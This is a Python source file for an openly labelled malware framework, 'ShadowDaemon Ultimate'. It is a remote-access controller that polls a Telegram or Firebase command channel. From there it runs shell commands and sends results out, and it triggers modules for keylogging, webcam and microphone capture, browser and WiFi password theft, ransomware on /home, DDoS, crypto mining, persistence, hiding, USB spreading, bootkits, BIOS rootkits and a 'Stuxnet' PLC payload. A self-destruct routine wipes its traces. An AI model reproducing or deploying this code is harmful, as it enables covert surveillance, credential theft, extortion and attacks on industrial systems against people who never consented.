#!/usr/bin/env python3
"""
SHADOWDAEMON ULTIMATE EDITION - イズミー Active 😈🔥
Complete Malware Framework for Linux - TERMUX EDITION
"""

import os
import sys
import json
import time
import threading
import subprocess
import socket
import platform
import base64
import random
import signal
from datetime import datetime
from pathlib import Path

from modules import (
    shell, keylogger, webcam, mic, screenshot, ransomware, miner, ddos, persistence,
    payload_gen, crypter, usb_spreader, password_stealer, screen_recorder,
    geo_tracker, wifi_stealer, remote_control, scheduler, anti_forensic, hider,
    port_knocking, dns_tunneling, cpu_microcode,
    network_exploiter, plc_scada, bootkit, bios_rootkit,
    hardware_keylogger, usb_rubber_ducky
)
from c2 import telegram_c2, firebase_c2

CONFIG_FILE = "config.json"
VERSION = "Termux 2.0"
BANNER = f"""
╔═══════════════════════════════════════════════════════════╗
║   SHADOWDAEMON ULTIMATE EDITION v{VERSION}               ║
║   イズミー Active 😈🔥                                    ║
║   Complete Malware Framework for Termux                  ║
║   From Basic to Apocalyptic Level                        ║
╚═══════════════════════════════════════════════════════════╝
"""

class ShadowDaemonUltimate:
    def __init__(self):
        print(BANNER)
        self.uid = self.get_uid()
        self.config = self.load_config()
        self.running = True
        self.c2 = self.setup_c2()
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
        self.initialize()

    def get_uid(self):
        try:
            return subprocess.check_output("cat /var/lib/dbus/machine-id", shell=True).decode().strip()
        except:
            try:
                return subprocess.check_output("hostname", shell=True).decode().strip()
            except:
                return socket.gethostname()

    def load_config(self):
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        else:
            default = {
                "c2_type": "telegram",
                "telegram_token": "YOUR_BOT_TOKEN",
                "telegram_chat_id": "YOUR_CHAT_ID",
                "firebase_url": "https://your-db.firebaseio.com/commands/{uid}.json",
                "persistence": False,
                "miner_wallet": "YOUR_MONERO_WALLET",
                "miner_pool": "pool.supportxmr.com:3333",
                "target_ip": "192.168.1.1",
                "subnet": "192.168.1.0/24",
                "auto_start_modules": ["keylogger", "geo_tracker"]
            }
            with open(CONFIG_FILE, 'w') as f:
                json.dump(default, f, indent=4)
            print("[!] Edit config.json first!")
            sys.exit(1)

    def setup_c2(self):
        if self.config.get("c2_type") == "telegram":
            return telegram_c2.TelegramC2(
                self.config["telegram_token"],
                self.config["telegram_chat_id"]
            )
        else:
            return firebase_c2.FirebaseC2(self.config["firebase_url"])

    def initialize(self):
        self.c2.send_message(f"🚀 ShadowDaemon Ultimate v{VERSION} aktif!")
        self.c2.send_message(f"💻 OS: {platform.system()} {platform.release()}")
        self.c2.send_message(f"🌐 IP: {self.get_public_ip()}")
        self.c2.send_message(f"🆔 UID: {self.uid}")
        if self.config.get("persistence", False):
            persistence.install()
            self.c2.send_message("🔒 Persistence installed!")
        for module in self.config.get("auto_start_modules", []):
            self.start_module(module)

    def get_public_ip(self):
        try:
            return subprocess.check_output("curl -s ifconfig.me", shell=True).decode().strip()
        except:
            return "unknown"

    def start_module(self, module_name):
        try:
            if module_name == "keylogger":
                keylogger.start()
            elif module_name == "geo_tracker":
                geo_tracker.get_location()
            return f"Started {module_name}"
        except:
            return f"Failed to start {module_name}"

    def execute_command(self, cmd):
        try:
            if cmd.startswith("shell:"):
                result = shell.execute(cmd.replace("shell:", ""))
                self.c2.send_message(f"📟 Output:\n{result[:4000]}")
            elif cmd == "info":
                self.c2.send_message(self.get_system_info())
            elif cmd == "help":
                self.c2.send_message(self.get_help())
            elif cmd == "geo_location":
                self.c2.send_message(geo_tracker.get_location())
            elif cmd == "wifi_pass":
                self.c2.send_message(f"📶 WiFi:\n{wifi_stealer.steal_wifi_passwords()}")
            elif cmd == "scan_network":
                self.c2.send_message(f"🌐 Network:\n{network_exploiter.NetworkExploiter().scan_network(self.config.get('subnet','192.168.1.0/24'))}")
            elif cmd == "steal_passwords":
                self.c2.send_message(f"🔑 Passwords:\n{password_stealer.steal_chrome_passwords()}")
            elif cmd == "screenshot":
                self.c2.send_file(screenshot.capture())
            elif cmd == "webcam":
                self.c2.send_file(webcam.capture())
            elif cmd == "mic":
                self.c2.send_file(mic.record(10))
            elif cmd == "record_screen":
                self.c2.send_file(screen_recorder.record_screen(30))
            elif cmd == "keylog_start":
                self.c2.send_message(keylogger.start())
            elif cmd == "keylog_stop":
                self.c2.send_message(keylogger.stop())
            elif cmd == "keylog_get":
                self.c2.send_message(f"📝 Keylog:\n{keylogger.get_logs()}")
            elif cmd == "ransomware":
                self.c2.send_message(ransomware.encrypt_files("/home"))
            elif cmd.startswith("ddos:"):
                p = cmd.replace("ddos:", "").split()
                if len(p) >= 2:
                    threading.Thread(target=ddos.flood, args=(p[0], int(p[1]), int(p[2]) if len(p)>2 else 60)).start()
                    self.c2.send_message(f"💥 DDoS on {p[0]}:{p[1]}")
            elif cmd.startswith("knock:"):
                port_knocking.PortKnocking().run_client(cmd.replace("knock:", ""), "open")
                self.c2.send_message(f"🚪 Knock sent")
            elif cmd.startswith("network_exploit:"):
                parts = cmd.replace("network_exploit:", "").split(":")
                net = network_exploiter.NetworkExploiter()
                self.c2.send_message(f"🌐 Exploit:\n{net.run_exploit(parts[0], target_ip=parts[1] if len(parts)>1 else '192.168.1.1')}")
            elif cmd == "industrial_flood":
                self.c2.send_message(f"🏭 Flood:\n{plc_scada.PLCHacker().industrial_flood(self.config.get('target_ip','192.168.1.1'))}")
            elif cmd == "miner_start":
                self.c2.send_message(miner.start(self.config["miner_wallet"], self.config["miner_pool"]))
            elif cmd == "miner_stop":
                self.c2.send_message(miner.stop())
            elif cmd == "persist":
                self.c2.send_message(persistence.install())
            elif cmd == "hide_self":
                hider.hide_process()
                hider.rename_process("[systemd]")
                self.c2.send_message("👻 Hidden!")
            elif cmd == "wipe_trails":
                anti_forensic.wipe_trails()
                self.c2.send_message("🧹 Wiped!")
            elif cmd == "usb_spread":
                threading.Thread(target=usb_spreader.watch_usb).start()
                self.c2.send_message("💾 USB spreader active!")
            elif cmd == "setup_usb_keylogger":
                self.c2.send_message(f"⌨️ USB KL:\n{hardware_keylogger.HardwareKeylogger().setup_usb_keylogger()}")
            elif cmd.startswith("create_ducky:"):
                rd = usb_rubber_ducky.USB_RubberDucky()
                script = rd.create_ducky_script(rd.generate_ducky(cmd.replace("create_ducky:", "")))
                with open("/tmp/ducky_script.txt", 'w') as f:
                    f.write(script)
                self.c2.send_file("/tmp/ducky_script.txt")
            elif cmd == "install_bootkit":
                self.c2.send_message(f"💻 Bootkit:\n{bootkit.Bootkit().install_bootkit()}")
            elif cmd == "install_bios_rootkit":
                self.c2.send_message(f"⚡ BIOS Rootkit:\n{bios_rootkit.BIOSRootkit().install_bios_rootkit()}")
            elif cmd == "install_cpu_backdoor":
                self.c2.send_message(f"🔬 CPU:\n{cpu_microcode.CPUMicrocode().install_cpu_backdoor()}")
            elif cmd.startswith("trigger_smm:"):
                self.c2.send_message(f"⚡ SMM:\n{cpu_microcode.CPUMicrocode().trigger_smm_backdoor(cmd.replace('trigger_smm:',''))}")
            elif cmd.startswith("scan_plc:"):
                self.c2.send_message(f"🏭 PLC:\n{plc_scada.PLCHacker().scan_network(cmd.replace('scan_plc:',''))}")
            elif cmd.startswith("stuxnet:"):
                self.c2.send_message(f"☢️ Stuxnet:\n{plc_scada.PLCHacker().stuxnet_payload([cmd.replace('stuxnet:','')])}")
            elif cmd.startswith("dns_tunnel:"):
                self.c2.send_message(dns_tunneling.DNSTunnel().send_data(cmd.replace("dns_tunnel:", "")))
            elif cmd == "gen_payload":
                self.c2.send_file(payload_gen.generate_payload())
            elif cmd == "crypt_binary":
                self.c2.send_message(f"🔐 Crypted:\n{crypter.crypt_binary('shadow.py')}")
            elif cmd.startswith("mouse:"):
                x, y = cmd.replace("mouse:", "").split(",")
                self.c2.send_message(remote_control.move_mouse(int(x), int(y)))
            elif cmd.startswith("type:"):
                self.c2.send_message(remote_control.type_text(cmd.replace("type:", "")))
            elif cmd == "selfdestruct":
                self.c2.send_message("💀 Self-destruct!")
                time.sleep(2)
                self.destroy()
            else:
                self.c2.send_message(f"❌ Unknown: {cmd}\nType 'help'")
        except Exception as e:
            self.c2.send_message(f"❌ Error: {str(e)}")

    def get_system_info(self):
        return f"""
📊 SYSTEM:
Hostname: {socket.gethostname()}
OS: {platform.system()} {platform.release()}
IP: {self.get_public_ip()}
UID: {self.uid}
Uptime: {self.get_uptime()}
CPU: {self.get_cpu_usage()}%
RAM: {self.get_ram_usage()}%
Disk: {self.get_disk_usage()}%
"""

    def get_uptime(self):
        try:
            with open('/proc/uptime', 'r') as f:
                s = float(f.readline().split()[0])
                return f"{int(s//86400)}d {int((s%86400)//3600)}h"
        except:
            return "unknown"

    def get_cpu_usage(self):
        try:
            return subprocess.check_output("top -bn1 | grep 'Cpu(s)' | awk '{print $2}'", shell=True).decode().strip()
        except:
            return "0"

    def get_ram_usage(self):
        try:
            return subprocess.check_output("free -m | grep Mem | awk '{print $3/$2 * 100.0}'", shell=True).decode().strip()
        except:
            return "0"

    def get_disk_usage(self):
        try:
            return subprocess.check_output("df -h / | awk 'NR==2 {print $5}'", shell=True).decode().strip().replace('%', '')
        except:
            return "0"

    def get_help(self):
        return """
🔥 SHADOWDAEMON ULTIMATE - COMMAND LIST (TERMUX)

===== BASIC =====
shell:<cmd>     - Execute shell command
info            - Show system info
help            - Show this help

===== RECON =====
geo_location    - Get victim location
wifi_pass       - Steal WiFi passwords
scan_network    - Scan network
steal_passwords - Steal browser passwords

===== CAPTURE =====
screenshot      - Take screenshot
webcam          - Capture webcam
mic             - Record microphone (10s)
record_screen   - Record screen (30s)

===== KEYLOGGER =====
keylog_start    - Start keylogger (Dummy mode)
keylog_stop     - Stop keylogger
keylog_get      - Get keylogs

===== ATTACKS =====
ransomware      - Encrypt /home files
ddos:ip port    - DDoS attack
knock:ip        - Port knocking
network_exploit:type:target - Network exploits
industrial_flood - Flood industrial protocols

===== MINER =====
miner_start     - Start crypto miner
miner_stop      - Stop crypto miner

===== PERSISTENCE =====
persist         - Install persistence
hide_self       - Hide process
wipe_trails     - Wipe evidence

===== USB =====
usb_spread      - Auto-infect USB drives
setup_usb_keylogger - Setup hardware keylogger
create_ducky:type - Create Rubber Ducky payload

===== ADVANCED =====
install_bootkit - Infect bootloader
install_bios_rootkit - Infect BIOS/UEFI
install_cpu_backdoor - CPU microcode injection
trigger_smm:cmd - Trigger SMM backdoor

===== SCADA =====
scan_plc:subnet - Scan for PLCs
stuxnet:target  - Deploy Stuxnet payload

===== OTHER =====
gen_payload     - Generate FUD payload
crypt_binary    - Encrypt binary
mouse:x,y       - Move mouse
type:text       - Type text
selfdestruct    - Self-destruct
"""

    def destroy(self):
        anti_forensic.wipe_trails()
        os.system("rm -rf /tmp/*shadow* /var/log/*shadow*")
        os.system("crontab -r 2>/dev/null")
        os.system("systemctl stop shadow.service 2>/dev/null")
        os.system("systemctl disable shadow.service 2>/dev/null")
        os.system("rm -f /etc/systemd/system/shadow.service")
        os.remove(__file__)
        sys.exit(0)

    def signal_handler(self, sig, frame):
        print("\n[!] Shutting down...")
        self.running = False
        sys.exit(0)

    def run(self):
        print("[*] ShadowDaemon is running... Waiting for commands...")
        while self.running:
            try:
                commands = self.c2.get_commands()
                if commands:
                    for cmd in commands:
                        self.execute_command(cmd)
                        self.c2.delete_command(cmd)
                time.sleep(2)
            except Exception as e:
                print(f"[!] Error in main loop: {e}")
                time.sleep(5)

if __name__ == "__main__":
    daemon = ShadowDaemonUltimate()
    daemon.run()
